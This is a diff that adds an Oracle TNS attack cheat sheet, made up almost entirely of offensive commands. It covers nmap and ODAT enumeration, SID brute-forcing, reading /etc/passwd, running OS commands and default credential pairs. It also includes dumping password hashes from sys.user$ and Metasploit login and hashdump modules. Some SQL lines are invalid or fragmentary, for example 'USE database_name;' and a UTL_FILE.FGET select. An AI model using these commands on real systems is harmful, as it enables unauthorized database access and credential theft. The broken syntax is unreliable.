@@ -1,0 +1,84 @@
+==============================
+Oracle TNS (Transparent Network Substrate)
+Cheat Sheet – Professional
+==============================
+
+PORTS:
+1521/TCP – Oracle TNS Listener (default)
+1522/TCP – Secure listener
+Custom ports common
+
+Transport:
+TCP
+
+Purpose:
+Oracle DB network communication
+(Client ↔ Listener ↔ Database)
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p1521 -sV <IP>
+nmap -p1521 --script oracle-* <IP>
+
+nmap --script oracle-tns-version -p1521 <IP>
+nmap --script oracle-sid-brute -p1521 <IP>
+
+odat.py all -s <IP>
+odat.py sidguser -s <IP>
+odat.py -s <IP> -d [SID] -U user -P pass --getfile /etc/passwd
+odat.py exec -s <IP> -d [SID] -U user -P pass --cmd "whoami /priv"
+
+# Manual SID list examples
+ORCL
+XE
+PROD
+DEV
+TEST
+DB
+
+sqlplus user/password@<IP>:1521/SID
+sqlplus scott/tiger@10.10.10.10:1521/ORCL
+
+SELECT name FROM v$database;
+USE database_name;
+SELECT * FROM user_role_privs;
+SELECT * FROM user_sys_privs; ( Danger Role DBA, SYSDBA, SYSOPER )
+SELECT * FROM table_name;
+SELECT username FROM all_users;
+SELECT tablespace_name FROM dba_tablespaces;
+SELECT table_name FROM user_tables;
+SELECT column_name,data_type FROM all_tab_columns WHERE table_name='table_name';
+
+
+Common accounts:
+SYS / SYS
+SYSTEM / SYSTEM
+SCOTT / TIGER
+DBSNMP / DBSNMP
+OUTLN / OUTLN
+
+SELECT * FROM UTL_FILE.FGET('/etc/passwd');
+UTL_FILE.PUT_LINE(file, 'payload');
+
+EXEC dbms_java.runjava('command');
+CREATE OR REPLACE LIBRARY cmd AS '/bin/bash';
+SELECT name, password FROM sys.user$;
+
+use auxiliary/scanner/oracle/oracle_login
+use auxiliary/scanner/oracle/sid_brute
+use auxiliary/admin/oracle/oracle_hashdump
+
+listener.ora
+tnsnames.ora
+sqlnet.ora
+
+$ORACLE_HOME/network/log/listener.log
+$ORACLE_HOME/diag/
+
+nmap
+sqlplus
+metasploit
+odat (Oracle Database Attacking Tool)
+tnscmd
